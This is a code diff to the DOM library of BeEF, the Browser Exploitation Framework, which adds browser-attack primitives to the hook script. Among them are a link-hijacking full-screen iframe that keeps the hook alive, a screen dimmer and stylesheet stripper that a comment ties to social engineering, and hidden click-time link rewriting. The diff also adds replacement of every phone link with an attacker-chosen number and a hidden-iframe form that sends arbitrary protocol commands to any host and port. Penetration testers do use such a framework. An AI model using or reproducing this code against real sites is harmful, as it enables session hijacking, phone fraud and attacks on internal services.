@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 /*!
  * @literal object: beef.dom
  *
@@ -85,6 +76,30 @@ beef.dom = {
 		
 		return iframe;
 	},
+
+	/**
+	 * Returns the highest current z-index
+	 * @param: {Boolean} whether to return an associative array with the height AND the ID of the element
+	 * @return: {Integer} Highest z-index in the DOM
+	 * OR
+	 * @return: {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
+	 */
+	getHighestZindex: function(include_id) {
+		var highest = {'height':0, 'elem':''};
+		$j('*').each(function() {
+			var current_high = parseInt($j(this).css("zIndex"),10);
+			if (current_high > highest.height) {
+				highest.height = current_high;
+				highest.elem = $j(this).attr('id');
+			}
+		});
+
+		if (include_id) {
+			return highest;
+		} else {
+			return highest.height;
+		}
+	},
 	
 	/**
      * Create and iFrame element. In case it's create with POST method, the iFrame is automatically added to the DOM and submitted.
@@ -104,8 +119,15 @@ beef.dom = {
 			var form_action = params['src'];
 			params['src'] = '';
 		}
-		if (type == 'hidden') { css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles); }
-		if (type == 'fullscreen') { css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px'}, styles); $j('body').css({'padding':'0px', 'margin':'0px'}); }
+		if (type == 'hidden') {
+			css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
+		} else if (type == 'fullscreen') {
+			css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':beef.dom.getHighestZindex()+1}, styles);
+			$j('body').css({'padding':'0px', 'margin':'0px'});
+		} else {
+			css = styles;
+			$j('body').css({'padding':'0px', 'margin':'0px'});
+		}
 		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
 		
 		if (form_submit && form_action)
@@ -116,6 +138,94 @@ beef.dom = {
 			$j(form).prependTo('body').submit();
 		}
 		return iframe;
+	},
+
+    /**
+     * Load the link (href value) in an overlay foreground iFrame.
+     * The BeEF hook continues to run in background.
+     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
+     * Framebusting techniques, this will not work.
+     */
+    persistentIframe: function(){
+        $j('a').click(function(e) {
+            if ($j(this).attr('href') != '')
+            {
+                e.preventDefault();
+                beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
+                $j(document).attr('title', $j(this).html());
+                document.body.scroll = "no";
+                document.documentElement.style.overflow = 'hidden';
+            }
+        });
+    },
+
+    /**
+     * Load a full screen div that is black, or, transparent
+     * @param: {Boolean} vis: whether or not you want the screen dimmer enabled or not
+     * @param: {Hash} options: a collection of options to customise how the div is configured, as follows:
+     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
+     *           // By default this is 70 
+     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
+     *           // By default this will use beef.dom.getHighestZindex to always go to the top
+     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
+     *           // By default this is #000000
+     */
+	grayOut: function(vis, options) {
+	  // in any order.  Pass only the properties you need to set.
+	  var options = options || {};
+	  var zindex = options.zindex || beef.dom.getHighestZindex()+1;
+	  var opacity = options.opacity || 70;
+	  var opaque = (opacity / 100);
+	  var bgcolor = options.bgcolor || '#000000';
+	  var dark=document.getElementById('darkenScreenObject');
+	  if (!dark) {
+	    // The dark layer doesn't exist, it's never been created.  So we'll
+	    // create it here and apply some basic styles.
+	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
+	    var tbody = document.getElementsByTagName("body")[0];
+	    var tnode = document.createElement('div');           // Create the layer.
+	        tnode.style.position='absolute';                 // Position absolutely
+	        tnode.style.top='0px';                           // In the top
+	        tnode.style.left='0px';                          // Left corner of the page
+	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
+	        tnode.style.display='none';                      // Start out Hidden
+	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
+	    tbody.appendChild(tnode);                            // Add it to the web page
+	    dark=document.getElementById('darkenScreenObject');  // Get the object.
+	  }
+	  if (vis) {
+	    // Calculate the page width and height 
+	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
+	        var pageWidth = document.body.scrollWidth+'px';
+	        var pageHeight = document.body.scrollHeight+'px';
+	    } else if( document.body.offsetWidth ) {
+	      var pageWidth = document.body.offsetWidth+'px';
+	      var pageHeight = document.body.offsetHeight+'px';
+	    } else {
+	       var pageWidth='100%';
+	       var pageHeight='100%';
+	    }
+	    //set the shader to cover the entire page and make it visible.
+	    dark.style.opacity=opaque;
+	    dark.style.MozOpacity=opaque;
+	    dark.style.filter='alpha(opacity='+opacity+')';
+	    dark.style.zIndex=zindex;
+	    dark.style.backgroundColor=bgcolor;
+	    dark.style.width= pageWidth;
+	    dark.style.height= pageHeight;
+	    dark.style.display='block';
+	  } else {
+	     dark.style.display='none';
+	  }
+	},
+
+	/**
+	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
+	 *  or, re-writing a document this is useful.
+	 */
+	removeStylesheets: function() {
+		$j('link[rel=stylesheet]').remove();
+		$j('style').remove();
 	},
 	
 	/**
@@ -169,6 +279,23 @@ beef.dom = {
 	},
 
 	/**
+	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
+	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
+	 * @param: {String} url: the url to be rewritten
+	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return: {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteLinksClickEvents: function(url, selector) {
+		var sel = (selector == null) ? 'a' : selector;
+		return $j(sel).each(function() {
+			if ($j(this).attr('href') != null)
+			{
+				$j(this).click(function() {this.href=url});
+			}
+		}).length;
+	},
+
+	/**
      * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
 	 * @param: {String} old_protocol: the old link protocol to be rewritten
 	 * @param: {String} new_protocol: the new link protocol to be written
@@ -186,6 +313,31 @@ beef.dom = {
 				var url = $j(this).attr('href');
 				if (url.match(re)) {
 					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
+					count++;
+				}
+			}
+		});
+
+		return count;
+	},
+
+	/**
+	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
+	 * @param: {String} new_number: the new link telephone number to be written
+	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return: {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteTelLinks: function(new_number, selector) {
+
+		var count = 0;
+		var re = new RegExp("tel:/?/?.*", "gi");
+		var sel = (selector == null) ? 'a' : selector;
+
+		$j(sel).each(function() {
+			if ($j(this).attr('href') != null) {
+				var url = $j(this).attr('href');
+				if (url.match(re)) {
+					$j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
 					count++;
 				}
 			}
@@ -232,7 +384,8 @@ beef.dom = {
 
             if (codebase != null) {
                 content += "<param name='codebase' value='" + codebase + "' />"
-            }else{
+            }
+            if (archive != null){
                 content += "<param name='archive' value='" + archive + "' />";
             }
             if (params != null) {
@@ -240,7 +393,7 @@ beef.dom = {
             }
             content += "</object>";
         }
-        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO()) {
+        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {
 
             if (codebase != null) {
                 content = "" +
@@ -259,24 +412,25 @@ beef.dom = {
             }
             content += "</applet>";
         }
-        if (beef.browser.isFF()) {
-            if (codebase != null) {
-                content = "" +
-                    "<embed id='" + id + "' code='" + code + "' " +
-                    "type='application/x-java-applet' codebase='" + codebase + "' " +
-                    "height='0' width='0' name='" + name + "'>";
-            } else {
-                content = "" +
-                    "<embed id='" + id + "' code='" + code + "' " +
-                    "type='application/x-java-applet' archive='" + archive + "' " +
-                    "height='0' width='0' name='" + name + "'>";
-            }
-
-            if (params != null) {
-                content += beef.dom.parseAppletParams(params);
-            }
-            content += "</embed>";
-        }
+        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
+//        if (beef.browser.isFF()) {
+//            if (codebase != null) {
+//                content = "" +
+//                    "<embed id='" + id + "' code='" + code + "' " +
+//                    "type='application/x-java-applet' codebase='" + codebase + "' " +
+//                    "height='0' width='0' name='" + name + "'>";
+//            } else {
+//                content = "" +
+//                    "<embed id='" + id + "' code='" + code + "' " +
+//                    "type='application/x-java-applet' archive='" + archive + "' " +
+//                    "height='0' width='0' name='" + name + "'>";
+//            }
+//
+//            if (params != null) {
+//                content += beef.dom.parseAppletParams(params);
+//            }
+//            content += "</embed>";
+//        }
         $j('body').append(content);
     },
 
@@ -315,6 +469,30 @@ beef.dom = {
         formXsrf.submit();
 
         return iframeXsrf;
+    },
+
+    /**
+     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
+     * @params: {String} rhost: remote host ip/domain
+     * @params: {String} rport: remote port
+     * @params: {String} commands: protocol commands to be executed by the remote host:port service
+     */
+    createIframeIpecForm: function(rhost, rport, path, commands){
+        var iframeIpec = beef.dom.createInvisibleIframe();
+
+        var formIpec = document.createElement('form');
+        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
+        formIpec.setAttribute('method',  'POST');
+        formIpec.setAttribute('enctype', 'multipart/form-data');
+
+        input = document.createElement('textarea');
+        input.setAttribute('name', Math.random().toString(36).substring(5));
+        input.value = commands;
+        formIpec.appendChild(input);
+        iframeIpec.contentWindow.document.body.appendChild(formIpec);
+        formIpec.submit();
+
+        return iframeIpec;
     }
 
 };
